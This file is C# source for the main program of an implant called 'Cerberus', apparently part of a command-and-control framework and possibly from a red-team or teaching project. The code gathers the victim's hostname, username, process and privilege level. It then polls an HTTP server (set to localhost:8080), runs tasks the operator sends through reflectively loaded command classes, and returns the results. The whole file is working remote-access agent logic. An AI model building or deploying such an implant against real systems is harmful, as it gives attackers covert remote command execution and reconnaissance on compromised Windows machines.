using Cerberus.Models.CommModule;
using Cerberus.Models.Tasks;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Security.Principal;
using System.Threading;

namespace Cerberus
{
    class Program
    {
        private static CerberusMetadata _metadata;
        private static CommModule _commModule;
        private static CancellationTokenSource _cancellationTokenSource;

        private static List<CerberusCommand> _commands = new List<CerberusCommand>();

        private static int SleepTime = 1000;
        private static CommunicationType _commType = CommunicationType.http;

        private static string connectAddress = "localhost";
        private static int connectPort = 8080;

        public enum CommunicationType
        {
            http,
            smb
        }

        static void Main(string[] args)
        {
            Thread.Sleep(10000);

            GenerateMetadata();
            LoadCerberusCommands();


            if (_commType == CommunicationType.http)
            {
                _commModule = new HttpCommModule(connectAddress, connectPort, SleepTime, _metadata);
                _commModule.Init(_metadata);
                _commModule.Start();

                _cancellationTokenSource = new CancellationTokenSource();

                while (!_cancellationTokenSource.IsCancellationRequested)
                {
                    if (_commModule.RecvData(out var tasks))
                    {
                        HandleTasks(tasks);
                    }
                }
            }
            else if (_commType == CommunicationType.smb)
            {
                throw new NotImplementedException();
            }
        }

            

        private static void HandleTasks(IEnumerable<CerberusTask> tasks)
        {
            foreach (var task in tasks)
            {
                HandleTask(task);
            }
        }

        private static void HandleTask(CerberusTask task)
        {
            var command = _commands.FirstOrDefault(c => c.Name.Equals(task.Command, StringComparison.OrdinalIgnoreCase));

            if (command is null)
            {
                SendTaskResult(task.Id, "Command not found.");
                return;
            }

            try
            {
                var result = command.Execute(task);
                SendTaskResult(task.Id, result);
            }
            catch (Exception ex)
            {
                SendTaskResult(task.Id, ex.Message);
            }
        }

        private static void SendTaskResult(string taskId, string result)
        {
            var taskResult = new CerberusTaskResult
            {
                Id = taskId,
                Result = result
            };

            _commModule.SendData(taskResult);
        }

        public void Stop()
        {
            _cancellationTokenSource.Cancel();
        }

        private static void LoadCerberusCommands()
        {
            var self = Assembly.GetExecutingAssembly();

            foreach(var type in self.GetTypes())
            {
                if (type.IsSubclassOf(typeof(CerberusCommand)))
                {
                    var instance = (CerberusCommand) Activator.CreateInstance(type);
                    _commands.Add(instance);
                }
            }
        }

        private static void GenerateMetadata()
        {
            var process = Process.GetCurrentProcess();
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);

            var integrity = "Medium";

            if (identity.IsSystem)
            {
                integrity = "SYSTEM";
            }
            else if (principal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                integrity = "High";
            }

            _metadata = new CerberusMetadata
            {
                Id = Guid.NewGuid().ToString(),
                Hostname = Environment.MachineName,
                Username = identity.Name,
                ProcessName = process.ProcessName,
                ProcessId = process.Id,
                Integrity = integrity,
                Architecture = IntPtr.Size == 8 ? "x64" : "x86"
            };

            process.Dispose();
            identity.Dispose();
        }
    }
}
